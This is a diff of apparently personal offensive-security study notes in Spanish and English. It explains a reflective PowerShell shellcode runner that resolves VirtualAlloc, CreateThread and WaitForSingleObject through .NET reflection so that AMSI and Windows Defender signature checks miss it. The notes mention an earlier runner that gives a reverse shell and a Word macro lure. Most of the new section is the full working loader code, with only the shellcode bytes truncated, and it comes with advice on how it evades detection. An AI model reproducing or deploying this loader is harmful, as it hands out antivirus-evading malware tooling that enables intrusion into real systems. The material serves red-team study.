@@ -1,4 +1,4 @@
-# Calling Win32 APIs from VBA
+### Calling Win32 APIs from VBA
 
 🟢 Fase 1: El Enganche (Word y VBA)
 La víctima abre el documento .docm y hace clic en "Habilitar contenido".
@@ -149,3 +149,107 @@ Finally, we called CreateThread, supplying the starting address.
 
 If we run this code from PowerShell ISE, we get a reverse shell. Nice.
 
+
+
+## "Reflective" (Reflectiva) de un shellcode runner
+
+Este script es una versión "Reflective" (Reflectiva) de un shellcode runner, y representa una técnica de evasión mucho más avanzada que la que hicimos con Add-Type.
+
+Ambos scripts logran exactamente lo mismo (ejecutar shellcode en memoria usando VirtualAlloc, Marshal.Copy y CreateThread), pero la forma en que obtienen las direcciones de las funciones de Windows es completamente distinta.
+
+Aquí te explico la diferencia principal:
+1. El método anterior (Add-Type + DllImport)
+En el script que hicimos antes, usábamos Add-Type para compilar código C# que contenía declaraciones como:
+
+csharp
+[DllImport("kernel32.dll")]
+public static extern IntPtr VirtualAlloc(...);
+Cómo funciona: .NET lee el DllImport y, en tiempo de ejecución, busca en kernel32.dll la función VirtualAlloc, la carga y la expone a PowerShell como un método normal.
+
+Problema de evasión: Para que esto funcione, la cadena "DllImport", "VirtualAlloc" y "kernel32.dll" quedan escritas en texto plano en el script. AMSI (Antimalware Scan Interface) de Windows Defender escanea ese texto y bloquea el script al instante porque es una firma clásica de malware.
+
+2. El método nuevo (Reflective Loader)
+Este script no usa Add-Type ni DllImport. En su lugar, hace lo siguiente:
+
+LookupFunc:
+Esta función usa reflexión de .NET ([AppDomain]::CurrentDomain.GetAssemblies()) para buscar dentro del ensamblado System.dll una clase interna de .NET llamada Microsoft.Win32.UnsafeNativeMethods.
+Una vez encontrada, ejecuta métodos internos de .NET llamados GetModuleHandle (que obtiene la dirección base de kernel32.dll) y GetProcAddress (que busca la dirección de memoria exacta de una función como VirtualAlloc dentro de esa DLL).
+
+Ventaja: No necesitas declarar la función con DllImport. Obtienes el puntero de memoria directamente.
+
+getDelegateType:
+Una vez que tienes la dirección de memoria de VirtualAlloc (que es solo un número, un puntero), PowerShell no puede llamarlo directamente porque no sabe qué tipo de función es. Esta función usa System.Reflection.Emit para crear dinámicamente un "Delegado" en memoria. Un Delegado es como un puntero a función de C#, que le dice a .NET: "Esta dirección de memoria recibe 4 parámetros y devuelve un puntero".
+
+GetDelegateForFunctionPointer:
+Aquí es donde se unen las dos partes. Toma el puntero devuelto por LookupFunc y lo convierte en un Delegado de .NET usando la plantilla creada por getDelegateType. Ahora ya puedes llamar a VirtualAlloc como si fuera una función normal de PowerShell.
+
+WaitForSingleObject:
+Al final, usan esta API para pausar el script de PowerShell y evitar que la consola se cierre inmediatamente después de lanzar el shellcode. Así se mantiene la conexión viva.
+
+📊 Comparativa rápida:
+
+| Característica | Add-Type + DllImport | Reflective Loader |
+| :--- | :--- | :--- |
+| **Compilación** | Compila código C# en tiempo real. | No compila C#. Usa reflexión pura de .NET. |
+| **Obtención de APIs** | Mediante `[DllImport]`. | Mediante `GetModuleHandle` + `GetProcAddress`. |
+| **Visibilidad de strings** | Muy alto. Las cadenas "kernel32.dll" y "VirtualAlloc" quedan en texto plano. | Bajo. Las APIs se pasan como argumentos de texto, pero no se declaran. |
+| **Evasión de AMSI** | Muy pobre. AMSI detecta `DllImport` y `VirtualAlloc` al instante. | Mejor. Evita la firma de `DllImport`. |
+| **Complejidad** | Baja. Fácil de entender y escribir. | Alta. Requiere entender reflexión, delegados y punteros en .NET. |
+
+
+⚠️ ¿Por qué se usa esto en ciberseguridad ofensiva?
+El objetivo de este script es evadir la detección basada en firmas. Al eliminar Add-Type y DllImport, el script ya no contiene las palabras clave que Windows Defender busca para bloquear scripts maliciosos. Es una técnica clásica de "Living off the Land" (LotL) y evasión de AMSI.
+
+¿Funciona en tu laboratorio?
+Depende de la versión de Windows Defender. Aunque este script evade la detección estática (de texto), Windows Defender moderno también tiene detección de comportamiento. Si ve que un proceso de PowerShell llama a VirtualAlloc con permisos RWX y luego a CreateThread, te bloqueará igual, aunque el script no contenga las palabras prohibidas.
+
+Conclusión: Este script es un paso más en la escalera de la evasión. Para que funcione en tu laboratorio, necesitas que Windows Defender esté totalmente desactivado (o hayas añadido exclusiones para powershell.exe y powershell_ise.exe). Si quieres probarlo, asegúrate de reemplazar el $buf completo (el que tienes tiene puntos suspensivos ... y fallará).
+
+```
+function LookupFunc {
+
+	Param ($moduleName, $functionName)
+
+	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+}
+
+function getDelegateType {
+
+	Param (
+		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+		[Parameter(Position = 1)] [Type] $delType = [Void]
+	)
+
+	$type = [AppDomain]::CurrentDomain.
+    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
+    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+      DefineDynamicModule('InMemoryModule', $false).
+      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
+      [System.MulticastDelegate])
+
+  $type.
+    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
+      SetImplementationFlags('Runtime, Managed')
+
+  $type.
+    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
+      SetImplementationFlags('Runtime, Managed')
+
+	return $type.CreateType()
+}
+
+$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
+
+[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...
+
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
+
+$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
+
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
+```
